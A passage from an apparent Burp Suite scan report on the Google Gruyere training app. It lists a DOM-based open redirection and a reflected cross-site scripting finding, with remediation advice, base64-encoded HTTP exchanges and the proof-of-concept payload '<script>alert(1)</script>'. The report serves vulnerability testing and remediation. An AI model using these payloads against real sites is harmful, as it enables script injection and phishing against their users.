    <type>5243153</type>
    <name><![CDATA[Open redirection (reflected DOM-based)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/snippets.gtl [uid parameter]]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>Reflected DOM-based vulnerabilities arise when data is copied from a request and echoed into the application's immediate response within a part of the DOM that is then processed in an unsafe way by a client-side script. An attacker can leverage the reflection to control a part of the response (for example, a JavaScript string) that can be used to trigger the DOM-based vulnerability.</p>
<p>DOM-based open redirection arises when a script  writes controllable data into the target of a redirection in an unsafe way. An attacker may be able to use the vulnerability to  construct a URL that, if visited by another application user, will cause a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.</p>
<p><b>Note:</b> If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack, by using a URL with the javascript: pseudo-protocol to execute arbitrary script code when the URL is processed by the browser.</p>

<p>Burp Suite automatically identifies this issue using static code analysis, which may lead to false positives that are not actually exploitable. The relevant code and execution paths should be reviewed to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based open redirection vulnerabilities is not to dynamically set redirection targets using data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing an arbitrary URL as a redirection target. In general, this is best achieved by using a whitelist of URLs that are permitted redirection targets, and strictly validating the target against this list before performing the redirection.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601: URL Redirection to Untrusted Site ('Open Redirect')</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to reflected DOM-based open redirection.<br><br>The value of the <b>uid</b> request parameter is copied into a JavaScript string literal. The payload <b>evzwl/og1wm</b> was submitted in the uid parameter.<br><br>The string containing the payload is then passed to <b>the 'open()' function of an XMLHttpRequest object</b> via the following statements:<ul><li>_refreshSnippets("421683968655469260586300829583795792326", "brieevzwl/og1wm")</li><li>_refresh("/" + uniqueId + "/feed.gtl?uid=" + uid, _finishRefreshSnippets);</li><li>httpRequest.open("GET", url, true);</li></ul>]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsP3VpZD1icmllZXZ6d2wlMmZvZzF3bSBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNDE4NzRjNjRmMWJhNTM2ZDU0YmI0ODJlODUzOTE0YzMNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MTowNCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjk5NA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFNuaXBwZXRzPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjxzY3JpcHQgc3JjPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xpYi5qcyIgdGV4dD0idGV4dC9qYXZhc2NyaXB0Ij4KPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgoKCjxkaXYgY2xhc3M9J21lbnUnPgogIDxzcGFuIGlkPSdtZW51LWxlZnQnPgogICAgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8nPkhvbWU8L2E+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsJz5NeSZuYnNwO1NuaXBwZXRzPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwnPk5ldyZuYnNwO1NuaXBwZXQ8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi91cGxvYWQuZ3RsJz5VcGxvYWQ8L2E+CiAgICAgIAogIDwvc3Bhbj4KICA8c3BhbiBpZD0nbWVudS1yaWdodCc+CiAgICAgIAogICAgICA8c3BhbiBjbGFzcz0nbWVudS11c2VyJz4KICAgICAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20gJmx0OzU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSZndDsKICAgICAgPC9zcGFuPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2VkaXRwcm9maWxlLmd0bCc+UHJvZmlsZTwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ291dCc+U2lnbiBvdXQ8L2E+CiAgICAgIAogICAgICAKICA8L3NwYW4+CjwvZGl2PgoKPGRpdj4KPGgyIGNsYXNzPSdoYXMtcmVmcmVzaCcgaWQ9InVzZXJfbmFtZSI+CgogIGJyaWVldnp3bC9vZzF3bQogIAoKCjwvaDI+CjxkaXYgY2xhc3M9J3JlZnJlc2gnPjxhIGNsYXNzPSdidXR0b24nCiAgb25jbGljaz0nX3JlZnJlc2hTbmlwcGV0cygiNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2IiwgImJyaWVldnp3bC9vZzF3bSIpJwogIGhyZWY9JyMnPlJlZnJlc2g8L2E+PC9kaXY+CjxkaXYgY2xhc3M9J2NvbnRlbnQnPgoKCiAgCiAgICBicmllZXZ6d2wvb2cxd20KICAgIGlzIG5vdCBhbiBhdXRob3IuCiAgCiAgCgoKCjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbGliLmpzIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8NCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL2phdmFzY3JpcHQNCkNhY2hlLWNvbnRyb2w6IHB1YmxpYywgbWF4LWFnZT03MjAwDQpYLVhTUy1Qcm90ZWN0aW9uOiAwDQpYLUNsb3VkLVRyYWNlLUNvbnRleHQ6IGRjNzFkZjliNjc4NzkzZTA5MjFlNjFhYzNlZDkzOTViDQpWYXJ5OiBBY2NlcHQtRW5jb2RpbmcNCkRhdGU6IFRodSwgMTggSmFuIDIwMTggMDk6Mjc6NDggR01UDQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDE5NjINCkNvbm5lY3Rpb246IGNsb3NlDQoNCi8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCi8qKgogKiBTd2FwcyB0aGUgZGlzcGxheSBzZXR0aW5ncyBvZiB0d28gZWxlbWVudHMuIEJlZm9yZSBjYWxsaW5nLCBleGFjdGx5IG9uZQogKiBvZiB0aGUgdHdvIGVsZW1lbnRzIHNob3VsZCBoYXZlIHN0eWxlPSJkaXNwbGF5Om5vbmUiIGFuZCBpdCBzaG93cyB0aGUgb25lCiAqIHRoYXQgaXMgaGlkZGVuIGFuZCBoaWRlcyB0aGUgb25lIHRoYXQgaXMgc2hvd24uCiAqLwpmdW5jdGlvbiBfc2hvd0hpZGUoaWQxLCBpZDIpIHsKICB2YXIgeDEgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZDEpOwogIHZhciB4MiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkMik7CiAgdmFyIHNob3duID0geDEuc3R5bGUuZGlzcGxheSAhPSAnJzsKICB4MS5zdHlsZS5kaXNwbGF5ID0gc2hvd24gPyAnJyA6ICdub25lJzsKICB4Mi5zdHlsZS5kaXNwbGF5ID0gc2hvd24gPyAnbm9uZScgOiAnJzsKfTsKCi8qKgogKiBSZWZyZXNoZXMgdGhlIGN1cnJlbnQgcGFnZSBieSBsb2FkaW5nIHRoZSB1cmwgYW5kIHRoZW4gcGFzc2luZyB0aGUKICoganNvbiByZXNwb25zZSBvYmplY3QgdG8gdGhlIGNhbGxiYWNrLgogKi8KZnVuY3Rpb24gX3JlZnJlc2godXJsLCBjYWxsYmFjaykgewogIHZhciBodHRwUmVxdWVzdCA9IHdpbmRvdy5YTUxIdHRwUmVxdWVzdCA/IG5ldyBYTUxIdHRwUmVxdWVzdCgpCiAgICAgIDogbmV3IEFjdGl2ZVhPYmplY3QoIk1pY3Jvc29mdC5YTUxIVFRQIik7CiAgaHR0cFJlcXVlc3Qub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICBpZiAoaHR0cFJlcXVlc3QucmVhZHlTdGF0ZSA9PSA0KSB7CiAgICAgIF9mZWVkID0gY2FsbGJhY2s7CiAgICAgIGV2YWwoJygnICsgaHR0cFJlcXVlc3QucmVzcG9uc2VUZXh0ICsgJyknKTsKICAgICAgaHR0cFJlcXVlc3QgPSBudWxsOwogICAgfQogIH0KICBodHRwUmVxdWVzdC5vcGVuKCJHRVQiLCB1cmwsIHRydWUpOwogIGh0dHBSZXF1ZXN0LnNlbmQobnVsbCk7Cn07CgovKioKICogUHJvY2Vzc2VzIHJlZnJlc2ggcmVzcG9uc2Ugeydwcml2YXRlX3NuaXBwZXQnOnNuaXBwZXQsIHVzZXI6c25pcHBldCwgLi4ufQogKi8KZnVuY3Rpb24gX2ZpbmlzaFJlZnJlc2hIb21lKHJlc3BvbnNlKSB7CiAgZm9yICh2YXIgdWlkIGluIHJlc3BvbnNlKSB7CiAgICB2YXIgZWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKHVpZCk7CiAgICBpZiAoZWxlbWVudCkgewogICAgICBlbGVtZW50LmlubmVySFRNTCA9IHJlc3BvbnNlW3VpZF07CiAgICB9CiAgfQp9OwoKZnVuY3Rpb24gX3JlZnJlc2hIb21lKHVuaXF1ZUlkKSB7CiAgX3JlZnJlc2goIi8iICsgdW5pcXVlSWQgKyAiL2ZlZWQuZ3RsIiwgX2ZpbmlzaFJlZnJlc2hIb21lKTsKfTsKCi8qKgogKiBQcm9jZXNzZXMgcmVmcmVzaCByZXNwb25zZSBbbmFtZSwgc25pcHBldCwgLi4uXQogKi8KZnVuY3Rpb24gX2ZpbmlzaFJlZnJlc2hTbmlwcGV0cyhyZXNwb25zZSkgewogIHZhciBuID0gcmVzcG9uc2UubGVuZ3RoOwogIHZhciBlbGVtZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJfbmFtZScpOwogIGlmIChuICYmIGVsZW1lbnQpIHsKICAgIGVsZW1lbnQuaW5uZXJIVE1MID0gcmVzcG9uc2VbMF07CiAgfQoKICAvLyBUaGUgc25pcHBldCBkaXZzIGFyZSBudW1iZXJlZCAwLCAxLCAuLi4KICBmb3IgKHZhciBpID0gMTsgaSA8IG47ICsraSkgewogICAgdmFyIGVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpIC0gMSk7CiAgICBpZiAoZWxlbWVudCkgewogICAgICBlbGVtZW50LmlubmVySFRNTCA9IHJlc3BvbnNlW2ldOwogICAgfQogIH0KfTsKCmZ1bmN0aW9uIF9yZWZyZXNoU25pcHBldHModW5pcXVlSWQsIHVpZCkgewogIF9yZWZyZXNoKCIvIiArIHVuaXF1ZUlkICsgIi9mZWVkLmd0bD91aWQ9IiArIHVpZCwgX2ZpbmlzaFJlZnJlc2hTbmlwcGV0cyk7Cn07Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3418001846604405760</serialNumber>
    <type>2097920</type>
    <name><![CDATA[Cross-site scripting (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/snippets.gtl [URL path filename]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the HTML document as plain text between tags. The payload <b>la3gv&lt;script&gt;alert(1)&lt;/script&gt;pt287</b> was submitted in the URL path filename. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsbGEzZ3YlM2NzY3JpcHQlM2VhbGVydCgxKSUzYy9zY3JpcHQlM2VwdDI4NyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNDY1ZmU0NjIwMDEzYjgwNDQ2N2JlOWQ3Mjg2MmE2M2QNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoxMiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY3Mg0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NT